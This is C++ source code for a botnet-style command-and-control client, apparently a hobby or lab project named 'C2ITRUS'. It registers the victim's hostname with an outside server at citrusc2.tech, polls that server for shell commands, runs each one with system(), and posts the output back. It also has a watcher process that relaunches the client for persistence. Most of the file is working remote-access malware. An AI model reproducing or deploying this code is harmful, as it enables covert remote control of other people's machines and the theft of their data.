#include <iostream>
#include <string>
#include <csignal>
#include <vector>
#include <fstream>
#include <thread>
#include <list>

#include <curl/curl.h>
#include <cstdio>

//#include <curlpp/cURLpp.hpp>
//#include <curlpp/Easy.hpp>
//#include <curlpp/Options.hpp>

#include <rapidjson/document.h>

#if defined(C2ITRUS_LINUX)
#include <unistd.h>
#endif

#if defined(C2ITRUS_WINDOWS)
#include <windows.h>
#include <winsock.h>
#endif


#if defined(C2ITRUS_LINUX)
std::string c2_register_url = "http://citrusc2.tech/bot/register/linux/";
#endif

#if defined(C2ITRUS_WINDOWS)
const std::string c2_register_url = "http://citrusc2.tech/bot/register/windows/";
#endif

std::string c2_poll_url = "http://citrusc2.tech/bot/poll";
std::string c2_results_url = "http://citrusc2.tech/out";



std::string process_name;

std::string get_host_name() {
    #if defined(C2ITRUS_LINUX)
    const std::size_t buffer_size = 4 * 1024;
    char buffer[buffer_size];
    gethostname(buffer, buffer_size);
    return std::string{buffer};
    #endif

    #if defined(C2ITRUS_WINDOWS)
    const std::size_t buffer_size = 4 * 1024;
    char buffer[buffer_size];
    gethostname(buffer, buffer_size);
    return std::string{buffer};
    #endif
}

size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
    auto& str = *reinterpret_cast<std::string*>(userp);
    str.append((char*)contents, size* nmemb);
    return size * nmemb;
}

size_t read_callback(void* ptr, size_t size, size_t nitems, void* userp) {
    std::string& str = *reinterpret_cast<std::string*>(userp);

    size_t bytes_to_copy = std::min(str.size() + 1, size * nitems);
    memcpy(ptr, str.data(), bytes_to_copy);
    return bytes_to_copy;
}

[[noreturn]]
void client_work() {
    std::string config_file_path{};
    if (getenv("HOME") != nullptr) {
        config_file_path += getenv("HOME");
        config_file_path += "/.config/c3.txt";
    }

    std::string uuid{};

    //Write UUID to config file

    FILE* uuid_fin = fopen(config_file_path.c_str(), "r");
    if (uuid_fin) {
        //Read uuid from config file
        std::string bytes;
        fseek(uuid_fin, 0l, SEEK_END);
        auto file_size = ftell(uuid_fin);
        rewind(uuid_fin);

        bytes.resize(file_size);
        fread(bytes.data(), sizeof(char), bytes.size(), uuid_fin);
        uuid = bytes;
    }

    CURL* curl = curl_easy_init();

    if (uuid.empty()) {
        //Register client and retrieve uuid

        FILE* fout = fopen(config_file_path.c_str(), "w+");
        if (!fout) {
            std::cerr << "Failed to open file" << std::endl;
            std::cerr << strerror(errno) << std::endl;
            errno = 0;
            exit(EXIT_FAILURE);
        }
        auto hostname = get_host_name();

        curl = curl_easy_init();
        if (!curl) {
            std::cerr << "curl_easy_init failed" << std::endl;
        }

        c2_register_url += hostname;

        std::string raw_json;

        curl_easy_setopt(curl, CURLOPT_URL, c2_register_url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, nullptr);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, 0);

        //curl_easy_setopt(curl, CURLOPT_POSTFIELDS, os_name.c_str());
        //curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, os_name.size());

        curl_easy_setopt(curl, CURLOPT_READFUNCTION, &read_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &raw_json);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        auto result = curl_easy_perform(curl);

        if (result != CURLE_OK) {
            std::cerr << "POST request failed" << std::endl;
            std::cerr << curl_easy_strerror(result);
            exit(EXIT_FAILURE);
        }

        rapidjson::Document document;
        document.Parse(raw_json.c_str());
        uuid = document["uuid"].GetString();

        fwrite(uuid.data(), sizeof(char), uuid.size(), fout);
        fflush(fout);
    }
    std::cout << "UUID: " << uuid << std::endl;

    std::string get_header = std::string("uuid:") + uuid;
    curl_slist *get_header_list = nullptr;
    get_header_list = curl_slist_append(get_header_list, get_header.c_str());

    while (true) {
        using std::chrono_literals::operator""ms;

        //Issue get request for work
        std::string command_json;

        curl_easy_setopt(curl, CURLOPT_URL, c2_poll_url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPGET, true);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &command_json);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, get_header_list);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        auto result = curl_easy_perform(curl);

        if (result != CURLE_OK) {
            std::cerr << "GET request failed:" << std::endl;
            std::cerr << curl_easy_strerror(result);
            exit(EXIT_FAILURE);
        }

        std::cout << "Command read:\n" << command_json << std::endl;

        rapidjson::Document command_document;
        command_document.Parse(command_json.c_str());
        if (command_document["task"].IsNull()) {
            std::this_thread::sleep_for(1000ms);
            continue;
        }

        std::string command = command_document["task"].GetString();

        std::cout << command << std::endl;

        //Pipe output of command to file
        command += " > ./output.txt";

        //Execute work
        int status = system(command.c_str());
        if (status != 0) {
            std::cerr << "command error code: " << status << std::endl;
        }

        //Read in data from file to temporary buffer
        std::string bytes;
        FILE* fin = fopen("./output.txt", "r");
        fseek(fin, 0l, SEEK_END);
        auto file_size = ftell(fin);
        rewind(fin);

        bytes.resize(file_size);
        fread(bytes.data(), sizeof(char), file_size, fin);

        std::cout << "Command output:" << std::endl;
        std::cout << bytes << std::endl << std::endl;



        //Issue post request for results
        curl_easy_reset(curl);

        std::string post_header = bytes;
        curl_slist *post_header_list = nullptr;
        post_header_list = curl_slist_append(post_header_list, post_header.c_str());

        curl_easy_setopt(curl, CURLOPT_VERBOSE, true);
        curl_easy_setopt(curl, CURLOPT_URL, c2_results_url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, bytes.data());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, bytes.size());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_header_list);

        //curl_mime* form = curl_mime_init(curl);
        //curl_mimepart* field = curl_mime_addpart(form);

        //curl_mime_name(field, "output");
        //curl_mime_filedata(field, bytes.c_str());

        //curl_easy_setopt(curl, CURLOPT_READDATA, &bytes);
        //curl_easy_setopt(curl, CURLOPT_READFUNCTION, &read_callback);
        //curl_easy_setopt(curl, CURLOPT_WRITEDATA, &bytes);
        //curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);

        result = curl_easy_perform(curl);

        if (result != CURLE_OK) {
            std::cerr << "GET request failed:" << std::endl;
            std::cerr << curl_easy_strerror(result);
            exit(EXIT_FAILURE);
        }

        std::this_thread::sleep_for(1000ms);
    }
}

#if defined C2ITRUS_LINUX

[[noreturn]]
void watcher_work() {
    std::cout << "Watcher started" << std::endl;

    while (true) {
        int parent_pid;
        do {
            parent_pid = getppid();
            std::cout << "Parent PID: " << parent_pid << std::endl;
            sleep(100);
        } while (parent_pid != 1);
        std::cout << "Parent PID: " << parent_pid << std::endl;

        //This process becomes the new client process and the
        execl(process_name.c_str(), process_name.c_str(), (char*)nullptr);
    }
}
#endif

#if defined C2ITRUS_WINDOWS

[[noreturn]]
void watcher_work() {
    while (true) {
        STARTUPINFO startup_info;

        PROCESS_INFORMATION process_info;

        createProcess(
            nullptr,
            process_name.c_str(),
            nullptr,
            nullptr,
            false,
            0,
            nullptr,
            nullptr,
            &startup_info,
            &process_info
        );



        /*
        int parent_pid;
        do {
            parent_pid = getppid();
            sleep(100);
        } while (parent_pid != 1);

        //Try to start process again
        while (system(process_name.c_str()) == 0);
        */
    }
}
#endif

#if defined(C2ITRUS_LINUX)
void add_watcher() {
    #if defined C2ITRUS_LINUX
    int pid = fork();
    if (pid == 0) {
        watcher_work();
    }
    std::cout << "Watcher pid:" << pid << std::endl;
    #endif
}
#endif

#if defined(C2ITRUS_WINDOW)
void add_watch() {

}
#endif

void spawn_workers(unsigned i) {
    if (i == 0) {
        return;
    }

    if (0 == fork()) {
        spawn_workers(i - 1);
    }
}

int sandbox_main(int argc, char* argv[]) {
    CURL* curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, c2_register_url.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, nullptr);
    curl_easy_setopt(curl, CURLOPT_READFUNCTION, read_callback);
    curl_easy_perform(curl);

    return EXIT_SUCCESS;
}

/*
void exit_callback() {
    std::cout << "Exited: " << getpid() << std::endl;
}
*/

int main(int argc, char* argv[]) {
    //return sandbox_main(argc, argv);
    //signal(SIGTERM, SIG_IGN);

    //atexit(exit_callback);

    process_name = argv[0];

    /*
    unsigned num_workers = std::thread::hardware_concurrency();
    if (argc > 1) {
        num_workers = std::atoi(argv[1]);
    }
    spawn_workers(num_workers);
    */

    //Add watcher
    //add_watcher();

    client_work();

    return EXIT_SUCCESS;
}
